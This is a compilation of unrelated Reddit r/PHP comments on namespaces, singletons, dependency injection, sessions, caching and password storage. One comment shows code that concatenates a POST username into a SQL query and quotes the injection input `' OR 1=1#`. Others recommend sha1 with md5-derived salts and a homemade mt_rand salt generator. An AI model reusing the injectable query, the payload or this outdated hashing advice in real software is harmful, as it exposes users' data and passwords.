Trying to figure out where a variable is supposed to be getting set, I found this: grep -r 'storeCode =' * include/helpdesk_unsubscribe.jsp: storeCode = store.getStoreCode(); include/helpdesk_unsubscribe.jsp: storeCode = request.getParameter("storeCode"); include/hd/store/contactNHD.jsp:String storeCode = store.getStoreCode(); product/prodMethods.jsp:String storeCode = ""; product/prodMethods.jsp: storeCode = storeCode; product/prodMethods.jsp: storeCode = strStoreCode; product/prodMethods.jsp: storeCode = strStoreCode; My last day at this company is next week. They finally drove me out when I told them I needed 7 guys for two projects and all I got was offshore. The main thing seems to be that you need to micromanage offshore people, or they just go crazy. Where as in the US, for the most part, it's the opposite. Micromanaging here will cause more problems than do good. And the css classes... w40h20 ... get the definition of .w40h20 { width: 40; height: 20 }. They had like 100 permutations of this in a file, I almost choked.
Not using them?
[They have been laughing even harder](http://www.reddit.com/r/programming/comments/79cut/php_is_going_to_use_backslash_as_a_namespace/) when they saw what namespaces PHP got. It's not just the syntax (won't fade away). In PHP "namespaces" are just another misnomer. Internally the Zend engine knows little about namespaces. Tokenizer and parser see them, but simply concatenate them as prefixes onto some identifiers. They do not exist as internal structure and so namespaces don't really behave as in other languages. You can't namespace variables or constants for example, nor can you get a list of classes or functions per namespace, or subnamespaces. It's just an internal hack to decorate identifiers.
1. use PDO 2. always use parameters, and never not use parameters 3. you may end up writing some dynamic sql to allow user-requested sorting or filter. always check that those field names are actual field names in your table 4. use htmlpurifier to prevent evil html/css/javascript/utf in your database
Today you usually should prefer spl_autoload_register()^1 over __autoload(). It supports multiple autoloaders, e.g. when you are using multiple libraries, each bringing their own autoload-implementation. Or you want to load some important classes with a class-file-mapping mechanism and falll back to PSR-0. [1] http://php.net/manual/en/function.spl-autoload-register.php
&gt; Furthermore, the singleton pattern, at least the traditional implementation of it, leaks memory because it holds a reference to itself, and can thus not be garbage collected. The reference in question is usually stored in a static class member. It's not really referencing itself; static members are essentially class scoped global variables. They are not contained within instances of the class. I'm not arguing for or against singletons here; I'm just pointing out that self-referencing and any memory leaks that might result from it (though last I checked, PHP fixed its handling of recursive references) aren't a concern with singletons.
But you create a strong dependecy on the PDB class in *all* your code. If you ever want to change the implementation you will have a hard time. Every class which relies on a db connection should get this dependency injected (setter or constructor). In case you want to autobuild you objects, when they are required, I would recommomend to use an dependency injection container. There is a really light one, Pimple^1, and a more complex, feature-stuffed, Symfony\Component\DependencyInjection^2. You might want to read http://fabien.potencier.org/article/62/create-your-own-framework-on-top-of-the-symfony2-components-part-12. This part explains dependency injection in a very good way. But the whole series is very worth reading. It introduces almost every important concept/pattern you need for standard php webapplications. [1] http://pimple.sensiolabs.org/ [2] https://github.com/symfony/DependencyInjection
&gt;The reference in question is usually stored in a static class member. It's not really referencing itself; static members are essentially class scoped global variables. You're right, it was sloppy wording on my side. &gt;aren't a concern with singletons. Yes they are. I might have worded it incorrectly, but singletons still leak memory because they aren't deleted by the garbage collector. There's plenty of information on the problem for you to read about on google, if you're interested.
Right, but the reason why they aren't deleted by the garbage collector is because the references, held in static members, are stored globally - which doesn't go out of scope until its unset or the script ends. As far as cyclic references and memory leaks, that was fixed in 5.3 when they added cycle detectors to the GC. But since singletons don't actually use cyclic or self references, this isn't a concern for singletons.
&gt;which doesn't go out of scope until its unset or the script ends. Well, that's the thing. If it isn't explicitly unset at the end of the execution, it *isn't* collected by the garbage collector. You'd need to kill the process to free up that memory. &gt;As far as cyclic references and memory leaks, that was fixed in 5.3 when they added cycle detectors to the GC. That is irrelevant to this discussion. I was talking about the memory leak which is inherent in the (traditional) singleton pattern's design. 
That's how you implement a Singleton, not how how you *use* it.
&gt; You'd need to kill the process to free up that memory. Forcibly kill? No. PHP keeps track of that memory and deallocates everything when the script terminates gracefully. Any global or static reference with execution scope is handled that way. You can't call it a memory leak unless PHP's mem manager releases the last reference to the memory without first deallocating it, resulting in memory that's not being tracked. &gt; I was talking about the memory leak which is inherent in the (traditional) singleton pattern's design. If you're talking about the fact that the reference to the single instance isn't released until the script ends, then like I said, that's not a memory leak. Otherwise you're going to have to show me an example of the traditional pattern, and then show me how I can exhaust either PHP's heap or system memory with it. 
This, this, a million times this. 
Heh, true. It's looks like a result of a WYSIWYG PHP editor... Really though, it's what my client deserved. Didn't want to pay a reasonable amount and went with a cheap overseas developer. What really bothered me about the code from this self proclaimed 'Software Engineer' was not only did he defile a decently written Joombla plugin but he completely removed all of the original licenses\copyrights on the top of every file and replaced it with his own comment block...
They're going to kill it off (hopefully) in *the version after 5.5. Hallelujah!
In PHP no true singleton exists though.. A singleton only lives for the duration of the script.. so it's really just a reference to the current request at most.
I like the idea of Drupal, however I question how easy it is to throw in some really custom features? Like reputation, "Was this post helpful", "Certified Expert Reviewers", "Report comment", "Reply to Review", etc. Is it hard to truly customize?
&gt;I was comparing PHP array to a static class in Java. Ok, but in which way? They're very different things both in implementation and in theory, so I really want to understand what you're after... Also, are you using "static class" and "singleton" interchangeably? A singleton is just a design pattern, they're not synonymous at all.
My mind was working in dynamic-languages at the time. Comparing a python class and a PHP array, for example, is extremely similar. They are both based off hashmaps. My main purpose was to say that both accessed their members by name. I think I probably was.
also here's my apc.ini file extension=apc.so apc.ttl=0 apc.user_ttl=7200 apc.shm_size=128M 
That seems to be a moderate case of fragmentation in APC. I've seen far worse than that. Anyway, keep in mind that the graph isn't very accurate.
Drupal is designed to be flexible above all else. There is almost nothing you cannot do, though obviously for certain use cases it may be more complex to do through drupal. For the things you mention... 1) Was this post helpful Could probably be handled by the vote up / vote down module 2) Certified expert reviewers Could be done with the role system and custom username theming, or a CCK field on users that is applied as a sort to review listing, etc. 3) Report comment There is the flag abuse module, but I'm not sure how well it works with 7.x. There may be others. 4) Reply to Review Built in commenting system (plus mollum for spam protection). The way drupal works is with a modular hook system. There are hooks for pretty much everything, and even most of the built in stuff is implemented as a drupal module just like you could write. 
Its normal and will be no problem if they have cache expiry set. If there is no expiry time set on an item it is classed as 'already expired'. When it runs out of space and needs to save something new, it doesn't 'defragment', it clears all expired items, then starts expiring items until it has a big enough block of space. *THEORY* The gaps are likely due to the memory addressing being set in 4KB blocks. If it tries to store even one bit, it would use a whole block (see: 4KB gaps). If something overflows out of a block by even one byte, it will use the whole block (see: 3.8KB gaps).
Heh, I've been trying to work on the same problem today, albeit for a different site. It keeps yelling at me that my browser won't accept cookies.
Haven't tested it yet, but I like the concepts so far. Bringing even more understandable terminology to testing shouldn't do anything except help.
Edit: first way i posted it didnt work ah cookies that is the problem then. i googled it and came up with this // Create temp file to store cookies $ckfile = tempnam ("/tmp", "CURLCOOKIE"); and curl_setopt($ch, CURLOPT_COOKIEJAR, $ckfile); // Stores cookies in the temp file 
Google CURLOPT_COOKIEJAR &amp; CURLOPT_COOKIEFILE 
See [here](http://curl.haxx.se/libcurl/php/examples/cookiejar.html) for an example of using a Cookie Jar with cURL and PHP. This will allow you to maintain your login after posting and being redirected.
You can login and do all the Reddity stuff using the API. https://ssl.reddit.com/api/login/USERNAME You can then POST api_type=json&amp;user=USERNAME&amp;passwd=PASSWORD Check out https://github.com/reddit/reddit/wiki for more info 
Funny, I see more gray on the old site. The only thing more grey is the version requirement for the current function. Last time I checked, the autocomplete was way too eager, and made it more difficult to find things. I do like the white background. Much better contrast for general text. I agree that the homepage is a bit busy compared to the rest of the site.
Unless you're willing to pay for a full suite, this is about the best you'll find at the moment. Also, it's built off drupal! \o/
Thanks that got me the Modhash aka uh only part of the puzzle I have left to get is the post id that comes with something like "23commentreply_" then I can post comments. I didn't see a post comment on the reddit api and I doubt it exists or there would be a lot of spammy bot comments 
yea but it dosn't look like you can comment
thank you that was very helpful
Should probably link to the [original article](http://www.phpfreaks.com/tutorial/an-introduction-to-php-and-mongodb) so they get the proper credit, and the code is actually formatted.
How do I set my FileZilla up like this? I have been looking through the settings and can't find that option anywhere.
wait what? which session functions are deprecated? Either I've missed a huge change in 5.3 (possible!) or you're mistaken. SSL? uhhh...
Uhhh.... session hasn't been depreciated. Go ahead and use session for login, it'll work fine. Source: http://php.net/manual/en/function.session-start.php
It's working fine for me. This is the code I have. require_once("reddit.php"); $reddit = new reddit(); $reddit-&gt;login("USERNAME", "PASSWORD"); $response = $reddit-&gt;addComment("t3_ozp1t", "Test Comment"); t3_ozp1t is [this thread.](http://www.reddit.com/r/randomshit/comments/ozp1t/) 
I just got finished documenting [SessionHandlerInterface](http://docs.php.net/manual/en/class.sessionhandlerinterface.php). This addition should make for more sensible custom session handlers.
&gt; But as soon as you want to use a function or a class from another namespace you'll have to import that function or class from that namespace using the 'use' keyword. There is no way around that. Not if you use the fully qualified name. Use is only there to make you have to type less if a lib or class is going to be used often in the file. I tend to never use use on class names and just call use on it's parent namespace so i end up with things like. namespace blah; use lib\db; $db = new db\mysql(); But I could have just done namespace blah; $db = new \lib\db\mysql();
is there an up-to-date list somewhere of everything that's going to be [new] in 5.4?
It's been a while since I've been in college(roughly 10 years), but I'd have do disagree with that statement. The CS curriculum I saw covered a wide variety of topics (operating system design, assembly, c++, c, algorithms, etc). I'd like to think the course work hasn't gone down hill.
do you know about [Pimple](http://pimple.sensiolabs.org/)? How does your solution differ?
Aside from mysqli and pdo take a look at mod_security.
Putting up with it and non-issue are two different things. While it's indeed just another subjective coding style issue, the backslash didn't come to be because it was sensible syntax, but because of "we couldn't be bothered to fix the parser". And that's reason enough for experienced developers to deflect. (Sidenode, even in single quotes the backslash does escape itself. It's unneeded [within], but a bit inconsistent.)
It's clearly not an issue from a technical standpoint, but after using it it still feels wrong to me, but I guess that's the reason *for* the hoopla, it's largely subjective :)
&gt;you should change your IDE to use 4 spaces instead of a tab so it looks right in github The hell he should. First of all, it is already spaced out properly. Secondly, by replacing tabs with spaces, you'll be eliminating the option of configuring the size of the tabs to fit your personal preference. This is a big no-no.
Well, it really depends on your application context (read: framework). When you use some kind of DIC, I would assume its available in your current situation, e.g. a controller. And the DIC would contain the database service or on a more abstract level the CustomerRepository service. Then you (controller-)code might look like: $results = $this-&gt;container-&gt;get('my.customer.repository')-&gt;getAll() // ... pass the results to the view handler... The definitions for the database connection and its injection into the CustomerRepository are now part of the DIC configuration.
I am impartial to either convention. Whichever coding standard I settle on will likely dictate this, however.
Still no short syntax for objects :( I guess this has to do with {'blah'} already being used in some situations
How would one go about registering their own implementation of SessionHandlerInterface?
While I'm wary of needless "object-orientate all the things!" this one seems indeed a significant simplification. Albeit it's a fringe feature and just a oneliner to begin with, and it'll take some years before it can be used per default. [[1]](http://w3techs.com/technologies/details/pl-php/5/all)
I think Object-to-Object typecasting should be doable! E.g. class Option {} class MockOption extends Option {} $o = new Option; $mo = (MockOption)$o; Since MockOption extends/implements Option, it **should** be allowable to typecast an Option onto it. Every other OOP language allows this (C++, Java, Python, Ruby), so why not PHP? RIght now the only way to do this is: $o = new Option; $serialData = serialize($o); $newData = str_replace('s:6:Option', 's:10:MockOption', $serialData); $o2 = unserialize($newData); Talk about crufty!!
I know what DI is. I use constructor-level DI almost exclusively these days. I know about constructor injection and setter injection, but that's it. What's this third way and how does it work?
This. And moreover, what are the implications for those of us already using Memcache or some other system for session management (rather than the default file-handler)?
While I'm still not that familiar with Di I think there are some issues with this. Primarily because everything shares the same namespace (the components/instances arrays). Say for example you need to use two of the same class but with different constructors. With the present system you can only have one instance of any given class because it uses the class name as the identifier. Worse if two classes use the same dependency it will only ever create one version of it and return the same object each time it's needed rather than creating a new instance. I had a go at resolving this but it ended up removing a lot of the original intent of the class - i.e. using reflection to match components to their constructor arguments. Either way it might be interesting to see: https://github.com/warmans/fogo/blob/master/container.php https://github.com/warmans/fogo/blob/master/examples/example2.php You must manually share components as constructors. Classes are still identified by their classname so you can't register more than one same-class component to the container but because components have their own scope you can pass in constructors that will never interfere with the container components. 
I totally understand the merits of DI. Please don't get me wrong. I'm totally for it, and I use constructor-level DI almost exclusively these days. I know about constructor injection and setter injection, but that's it. What's this third way and how does it work?
Tabs are preferred by most senior people who have experienced the pain of joining a shop that *regulates* **weird** space counts. For instance, SpeedFC mandated 2 spaces, and that's about as good as no indentation for me. A previous company mandated 3 spaces and another mandated 5. WTF?! And of course, it's these companies w/ braindead leadership that are most vehemently against using tabs. ---- I've found throughout the years that most noobs prefer spaces and most pros realize it's a slippery slope, that one shouldn't sacrifice just for GitHub formatting.
The current mirrored documentation doesn't make it clear, but the bleeding-edge docs for [session_set_save_handler](http://docs.php.net/session_set_save_handler) do. One passes an instance of a class implementing SessionHandlerInterface to session_set_save_handler.
It escapes itself, but it doesn't effect namespaces. 'a\\b' and 'a\b' both work.
Yeah, I heard Rasmus speak a few years back and from his negative attitude towards OOP and most of the new changes I've seen rolled out over the last decade, it's readily apparent that most of the Zend team is as well.
noobs? pros? what the actual fuck are you talking about? 4 spaces is a common practise defined in many extremely widely used (the most widely used) coding standards. It's not about 1337 haxor pro skillz for pwning noobs - it's about picking the standard and sticking to it. Use whatever you want just be consistent. I've found 4 spaces is best if you want to distribute your code using github or integrate with with a larger framework like Zend (given that the rest of the framework follows this standard).
They aren't static methods. The '::' (e.g. 'SessionHandler::close') is just a documentation convention.
You mean I don't have to write if(!isset($_SESSION['user_data'])){ return false; } anymore? AWESOME. 
Basically, a DI container just lets you organize the creation of objects that provide "services" to your application, by providing a consistent way of accessing them that also abstracts away the details of their instantiation. It lets you create a single "bootstrap.php" file that contains all your service object initiations (like the mail transport example in the link from my previous post). From there, you don't need to worry about the dependencies between them, or the configuration info needed to instantiate them, because it's all in the "bootstrap.php" file. Any time you need to use the mailer object, you would just say: $mailer = $container-&gt;getMailer (); Instead of: $mailer = new Zend_Mail (); $mailer-&gt;setDefaultTransport (new Zend_Mail_Transport_Smtp ('smtp.gmail.com', array ( /*etc*/ ))); In both cases, you're doing Dependency Injection, this just provides a container to keep it organized at the application level.
Was thinking the same question about additional parameters. Because some of the parameters may be injected objects and others might be settings, would it be better (or just add confusion) to say: $container-&gt;add ('SplFileInfo', 'example.txt'); I'm thinking of a case like this: class Foo { function __construct ($file, Logger $log) { // etc } } If you could initialize it like this: $container-&gt;add ('Foo', 'example.txt'); Then it could still automagically inject the Logger for you, keeping the benefit of your use of reflection.
Correct me if I'm wrong, but this checks the *status of session*, not a specific key. I believe you still will need to write your code to be sure the session key and value are actually written.
Although it's much more sensible now, you unfortunately still have to compare the result of the function to the PHP\_SESSION\_* constants. I'm going to be suggesting to internals that we change the values of the constants from - PHP_SESSION_DISABLED = 0 - PHP_SESSION_NONE = 1 - PHP_SESSION_ACTIVE = 2 to - PHP_SESSION_DISABLED = -1 - PHP_SESSION_NONE = 0 - PHP_SESSION_ACTIVE = 1 This way, you could do if(session_status()) to confirm that there is an active session.
You're not wrong. I just see this as a shortcut to some more meaningful tasks with one fell swoop. Although, as frozenfire just explained, it looks like I still have to assign a return value according to the result. 
Because this is purely an additional of functionality, there are no issues with backwards-compatibility (assuming there are no regressions).
Not assign, just compare. In the current version (RC6), you have to do if(session_status() === PHP_SESSION_ACTIVE)
I meant assign as in: if(session_status() === PHP_SESSION_ACTIVE){ return 'check user'; } My lingo isn't great.
if(-1) returns TRUE http://www.php.net/manual/en/types.comparisons.php
That's absolutely horrible!!
Just make `PHP_SESSION_DISABLED` be `FALSE`, like `strpos()`. /s
Let me spell it out for you. * **Mandating spaces is tyrannical.** No one can use any other spacing without breaking the layout of the code. Everyone has to support an arbitrary-selected number of spaces. * **Mandating tabs leads to freedom.** Anyone can set their preferred tab width. You can even set their width on UNIX consoles with relative ease.
It's still a value, so it makes sense. 
What I suggested above was contrived. Adding a single instance (likely configured prior to being added to the container, in the case of a logger) is useful, but not the answer to your question. In short, you shouldn't be injecting an SplFileInfo object or expect it to be created for you. The concept of DI is to inject complex business logic components into each other correctly and automatically - not to inject one-off properties. I have added a much more complete example to demonstrate this, as I believe I understand the source of your confusion: [https://github.com/jasonjohnson/fogo/blob/master/examples/example6.php](https://github.com/jasonjohnson/fogo/blob/master/examples/example6.php) Does this help at all? *Note: You could make this even easier to test by making InvoiceFinder an interface, and implementing a stub version (like the one I use in the example) and another live version which would access a data store.*
I have doubts with null representing a valid state, but it could be: * PHP_SESSION_DISABLED = null * PHP_SESSION_NONE = 0 * PHP_SESSION_ACTIVE = 1
?! Blowfish is a symmetric encryption algorithm - you'd never want to use that for passwords. sha1 on the other is a hashing algorithm, which is fine to use in this scenario. The author is right with thinking about salts for each individual password. Usually you just store the salt in a second column next to the password. For extra security you might want to use an additional application-wide static salt, you store somewhere in the filesystem. Your actual password generation looks now like this: $salt = md5(uniqid(rand(), true)); // random letters $hash = sha1(STATIC_SALT . $password . $salt); // store $hash and $salt in db To check the users password you just reconstruct the hash if (sha1(STATIC_SALT . $password. $dbSalt) == $dbHash) { // login, .... } Instead of using uniqid and md5, you can of course use any other mechanism to generate a salt. You might want a shorter substring (e.g. 9 bytes) as well. EDIT: One addition to the use of sha1(). There are stronger hashing algorithms outside by now. sha1()s advantage is that its supported in almost every version of PHP. If you are above 5.1.2 you can switch to sha256 with the [hash() function](http://us.php.net/manual/en/function.hash.php) 
Well, this solutions is problematic in the way that you would always need the type-safe comparators: Assume session_status() is PHP_SESSION_DISABLED: session_status() == PHP_SESSION_DISABLED // true session_status() == PHP_SESSION_NONE // true session_status() == PHP_SESSION_ACTIVE // false session_status() === PHP_SESSION_DISABLED // true session_status() === PHP_SESSION_NONE // false session_status() === PHP_SESSION_ACTIVE // false Same is valid for PHP_SESSION_NONE of course.
You might want to have a look into the higher level stream_* functions: [stream_socket_client](http://en.php.net/manual/en/function.stream-socket-client.php) supports [many protocols/transports out of the box](http://en.php.net/manual/en/transports.inet.php). You just need to create the right stream context with [stream_context_create](http://php.net/manual/en/function.stream-context-create.php). [Go here for SSL options](http://www.php.net/manual/en/context.ssl.php).
I often opt for this approach myself. DI containers can often be overkill, and can start to feel like just a souped-up Registry... :)
I don't know what OP posted (he deleted his post), but he may not have been too far off the mark about Blowfish. BCrypt, which is based on Blowfish's block cypher has been the recommendation for storing password hashes for some time. The popular password hashing framework [PHPass](http://www.openwall.com/phpass/) uses it as the first class algorithm. [And this article](http://codahale.com/how-to-safely-store-a-password/) is often cited and goes into more detail about the why's and how's of BCrypt. 
But... why do you need to specify UTF-8, if it's now the default??
How do I put on my web server?
In case the default changes in the future, as we can see happening right here.
I suppose. It would be extremely rare for this to be a legitimate problem. I'm not aware of any distributed build that does this, don't you have to `configure --disable-session`?
Again, I didn't say you couldn't use them seperately, but I said that if you use namespaces and you don't use autoloading that you're just giving yourself a lot of extra, unnecessary work. I also have never said that this is the biggest flaw of namespaces. I totaly agree with you that it isn't their biggest flaw. However, the main reason why this gives problems in PHP is that you can't use wildcards. When I use C++ and I use any external library a lot in a file, I can just say "using namespace &lt;namespacename&gt;" and I can use everything from that namespace. In PHP I'll have to manually list every single function or class that I want to use from that library. That's just not worth the effort for me. So "you have to type them out, even when aliasing them" is NOT applicable in any language that uses namespaces. Using a factory method to instantiate classes is of course a very good thing, I use that myself too, but in factories you'll see the problem even better. If you use a factory which is able to instantiate all class from package x, than you'll need a very long use list at the top of the factory file if you don't want to use the (fully) qualified name in every factory method. Also if you want to do some typechecking in your original file, you still need to import the namespaces there. A factory method isn't a way to avoid typing out whole namespaces, you're just moving the problem. 
Actually, it's *just* a modified version of the key expansion algorithm from blowfish. The actual cipher isn't actually used at all.
That's just **so far** from the truth. Find me *one* other language that treats -1 as true. Go hunting! I know for a fact that it is false in C, C++, C#, Java, ObjC, Basic, and Pascal.
I have 5.3.6 so...
I went to the directory php/extensions, should that work?
Looked really interesting on my localhost but I'm struggling to install it on a shared host (lunarpages). As far as I can make out it's very hungry on memory during the install. Just a heads up.
So it's not 5.3.7. You're good.
It depends on how you have configured your application. Most likely, you should put PHPass into a folder under your application directory and directly include the file where you need to use it. Also, make sure that the mcrypt library is installed if you want bcrypt: $ php -i | grep mcrypt
I'm now convinced you have a very limited experience with PHP namespaces, and are therefore talking out of your ass. In PHP, you alias a namespace name, a class name, or an interface name. You do not alias function names. If you're really worried about having to alias class names, then __alias the namespace they're in__ instead. What you're describing is a made up problem. &gt; Again, I didn't say you couldn't use them seperately, but I said that if you use namespaces and you don't use autoloading that you're just giving yourself a lot of extra, unnecessary work. I'm not doing this. If you're having difficulty remembering where you stated that you don't use autoloading or namespaces because you don't like namespaces, then __read back over the thread__. And don't make another claim about "what you're saying", without including that context.
What about MVC? Should the model connect to the database itself or should I manage the DB connection in the controler?
In my opinion the factory creating your Model should handle injecting the data source. What I would do is create a DataSource interface that various databases, apis, etc can be implemented by to provide data persistence. The ModelFactory injects the appropriate DataSource as needed by that Model. Alternatively if your Model needs multiple DataSources you can inject the DataSourceFactory itself or create a DI Container object that provides access to the appropriate DataSources for the Model. I definitely would not create this in the Controller. The Controller only gives data to the View from Model; if it knows anything more than that it knows too much. Fortunately, MVC is a more abstract pattern, in my opinion, and has a variety of implementations that might be suitable for a given architecture.
Okay, I am a bit confused, where do I run that code? &gt;$ php -i | grep mcrypt
So, if I am not using Prepared Statements, and just doing stuff like this: &lt;code&gt; //incoming variables $username = $_POST['username']; $password = $_POST['password']; $mysqli = new mysqli("herpy", "derpy", "daffy", "duck"); if ($mysqli-&gt;connect_errno) { printf("Connect failed: %s\n", $mysqli-&gt;connect_error); exit(); } $query = "SELECT password AS pw FROM `users` WHERE username ='" . $user ."'"; $result = $mysqli-&gt;query($query); $row = $result-&gt;fetch_object(); mysqli automatically checks the input? and someone cant do something like ‘ OR 1=1#
Please don't resort to calling people idiots, because you disagree with them.
It is a guideline of this subreddit that conversation be kept professional. If you wouldn't be comfortable saying what you said to your coworker, please don't say it here.
At least he shares his toe skin with others, when they ask.
Ok, I am asking because I don't understand enough to even hold a conversation about it, not because I have any leaning one way or the other. Please explain to me how Dependency Injection is better than this: class Db { protected static $_singleton = NULL; public static function getSingleton() { if (is_null(self::$_singleton)) { self::$_singleton = new Db(); } return self::$_singleton; } } ... later that day ... class Monkey { public function doSomeMagic() { $db = Db::getSingleton(); $db-&gt;query("..."); } } and: class Gorilla { protected $_db; public function __construct() { $this-&gt;_db = Db::getSingleton(); } public function doGorillaMagic() { $this-&gt;_db-&gt;query("..."); } } As long as you do it this way, you aren't technically instantiating the needed class inside of your constructors or methods and you can still access it as needed. Why is DI better?
I'm assuming you have command line access. If so, you could run: php -i | grep mcrypt to see if you have mcrypt installed. If not, then you can run: &lt;?php phpinfo(); ?&gt;
Because your classes are lying and they break the Single Responsibility Principle. The Gorilla is not only responsible for doing something with the database connection but creating the database connection too. This sounds like *two* responsibilities to me. When you create a Gorilla you think you're all fine and dandy not needing anything else, you can make a Gorilla anytime you want. After all there's no dependencies to prevent you from just creating a hundred Gorillas. What happens when your database goes down? Your Gorillas suddenly start screaming about a database and you have no bloody clue what they're talking. What database? You aren't supposed to need one of those! A banana maybe, but no database. By asking for a database to be injected in the constructor, when the Gorilla starts complaining about one you have a much better idea of what its complaining about and why its complaining about it. Also, this is gonna be insanely hard to unit test without somehow touching the real life database. How do you unit test your Gorilla? You don't know about the hidden dependency and your unit test gibberish gets pushed to the database because, hey, how were you supposed to know you needed to mock a database? I see no reason for bringing Singleton into PHP. One of the primary benefits in other languages is that it was application wide and you saw benefits with other aspects of your application. With this not a reality in PHP requests Singleton turns into little more than an encapsulation of global state and, in your code example, hidden dependencies.
I'm insulted at the implication that I wouldn't. Dry side or moist? Your choice.
reddit fully supports normal URLs. There's no reason for using a shortener. I didn't know what to expect when clicking the link. Was I going to go to php.net, a Google search page, a malicious website, or your grandmother's cat photos?
I prefer this pattern myself: public function __construct(mysqli $connection = null) { if (!$connection) $connection = NastyOlSingleton::getInstance(); $this-&gt;Connection = $connection; } In nearly all web applications, you have one database connection for the entire run of your page -- so why complicate the single most common use case? Or why involve weird DI frameworks? But If you are unit testing or doing something more complicated then you can still inject your dependencies if necessary. 
Now I see what you're saying, but I had to go elsewhere to fully understand: [Dependency Injection, or how to make simple concepts sound difficult](http://codeutopia.net/blog/2008/06/21/dependency-injection-or-how-to-make-simple-concepts-sound-difficult/). The funny thing about dependency injection is that I used to do it (without realizing it) when I started learning OOP but somehow it got weeded out of my bag of tricks. Now your explanation definitely makes sense, so thank you for taking the time to respond.
&gt;Also, I've used namespaces a lot in C++, I know how to use namespaces in general. So I think I can make a judgement about PHP namespaces. I don't think any reasonable person would look at that and agree with you. We could go round and round about the why of it, but at the end of the day, it isn't reasonable to think C++ experience is enough to qualify you to make judgements on a PHP feature. That's just all there is to it. &gt; This is still only a partial solution. E.g. the following won't work: It's like you're being willfully ignorant. In C++, including another file is a __compile time__ operation. Even when you're dynamically loading a library behind the file you just included, the include part is still a __compile time__ operation. What else is a compile time operation in C++? __name resolution__. In PHP, including another file is a __runtime__ operation. __name resolution__ is a compile time operation. This automatically means that any comparison between PHP and C++ in this respect is meaningless. C++ can do the stuff it does without suffering a performance penalty, otherwise you wouldn't see it doing the stuff it does. PHP can't do it without a performance penalty, so it doesn't. Nothing you say will change that. Seriously, you can talk until you're blue in the face, everything you say can make as much sense in your head as you want it. It still won't change the reality of the situation. &gt; As you can see the whole namespace importing part requires twice as much lines of code in PHP as it does in C++. But it isn't required. Yes you can hand wave your way to "examples", and I can counter every single one of them. Most of your arguments hinge on a single idea: _Always mimic your namespace hierarchy with the filesystem hierarchy_. Even *with* that "requirement", most of your claims are baseless and untrue. Without that requirement, they become downright ludicrous. You could solve most of your issues by not using deeply nested namespaces! That would solve your problems. But we both know you would never accept an answer like that. &gt; So since I tried out namespaces in PHP, I went back to manually include class files, so I can simply use the name of that class instead of a full path to the class. I love it. You quote me, tell me you didn't really say that, then repeat it when you explain your conclusion. __you stopped using autoloading because you didn't like namespaces__. Yeah. Exactly. And that's a stupid reason to stop using autoloading. And here's the kicker: I'm firmly against autoloading. It's a bad solution to the problem. All it does is add magic and guarantees that you never know how much latency any specific include file is going to take. There are better alternatives. And even I think it's bad decision making to move away from autoloading because you don't like namespaces. Think about that. &gt; In this thread I've stated multiple times that I don't think that namespaces and autoloading are directly related This kind of bullshit is why I'm no longer responding to you. When I originally stated they were "two separate issues", your response was "they go hand in hand". I'm all for arguing this shit, but when you start pretending you didn't say shit you did say, the conversation is over.
Add to that a fake column of salts and you have a frustrated hacker. 
Yes. But let's make that script customizable so we can use it with all of our projects. And maybe add some fancy reporting (like table, graphs). Now we have a great tool - why not share it with the rest of the world then. Guess we should refactor it a bit, make it more accessible. Maybe add some documentation? Script is evolving! Script is now Framework!
Then you can spend time testing your tests. Generally, you can rely on a testing framework itself to be bug-free. This means there is a much smaller amount of your own testing code to fuck up.
All in all it all comes down to testing if function X returns value Y, or if calling function Z results in other parts of the code beeing changed - yes. The site you've pointed out says "create a framework" - it could just as well say "create a set of scripts", it's all in the wording and framework is just a keyword to catch your eye I think ;) By using a framework, or just set of defined tests you are sure that the testing script itself is bug free (as in there is no way that a wrong result could be interpreted as a good one). You still have to write all of the test cases, just as you need to write the model / controller in a "web framework". In both cases the framework is just a set of tools that are considered to be best fit for the task at hand - if and how will you use it is entirely up to you.
Absolutely, you could, and it probably wouldn't even be that hard. But why would you do that instead of using a well tested framework that integrates well with other tools? If you have a good answer to that, then write your own. If you just want to see what it's like to write a unit testing framework, the by all means go ahead, just don't expect anyone else to be thrilled about using it unless it does something that existing frameworks don't. It's probably and excellent exercise to go through.
So every time you want to create a new UserTable instance, you need to do: $factory = new DbTableFactory(new mysqli(...)); $usertable_instance = $factory-&gt;getObject('UserTable'); Unless you have 1 (global) factory instance/singleton, you have to create a new factory (&amp; mysqli object) every time you need a UserTable object. Surely somewhere in your code you need a singleton / global to store the mssqli instance. Perhaps a DbTableFactoryFactory class is needed...
Let's just call it a "unit". Then it can be a function, a class, a script, a URL, an interactive widget, a...whatever is appropriate for a "unit".
You probably don't have read permission on the file
Please dont misunderstand..I am just stating my doubts....
why does someone whos as much of a dick as you get to voice their opinion? did it ever occur to you that he's probably a beginner?
While you are of course correct, #1 why invent the wheel? and #2 why distract people from what it is they really want to do? "test" their software. Not write the scripts around the tests to make them run together, report issues, keep their tests maintainable, etc. To be fair i've not done a lot of unit testing in PHP, but I have done a lot in java, and the JUnit frameworks are fairly well done, not bloated, and really do get you right down to coding the tests with minimal effort.
If you have QA that isn't great at programming, I would use one to be honest. The current QA engineer I have on my team is actually quite a solid programmer and has worked with several Unit Testing frameworks in the past. For our current application he opted to write a small class for all his assertions/comparisons to take care of our testing. It's worked out quite nicely.
Here is the method that I use. I always have 2 tables for the purpose of encrypting user data. One contains the typical username, password, etc and the other is an ambiguously named table with ambiguously named fields where one of the fields is FK of the member id. Every member gets their own salt... I use mcrypt to encrypt the data using an application level salt plus the member level salt. This is the function I use to generate the salt. public function salt($length=16, $upper=true, $lower=true, $numbers=true, $nonalpha=false) { $uppers = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; $lowers = "abcdefghijklmnopqrstuvwxyz"; $number = "0123456789"; $seed = array(); $salt = ''; if ($upper) { for ($c = 0; $c &lt;= 26; $c++) { $seed[] = $uppers{$c}; } } if ($lower) { for ($c = 0; $c &lt;= 26; $c++) { $seed[] = $lowers{$c}; } } if ($numbers) { for ($c = 0; $c &lt;= 10; $c++) { $seed[] = $number{$c}; } } if ($nonalpha) { for ($c = 0; $c &lt; 128; $c++) { $seed[] = chr(128 + $c); } } shuffle($seed); for ($x = 1; $x &lt;= $length; $x++) { $salt .= $seed[mt_rand(0, count($seed) - 1)]; } return($salt); }
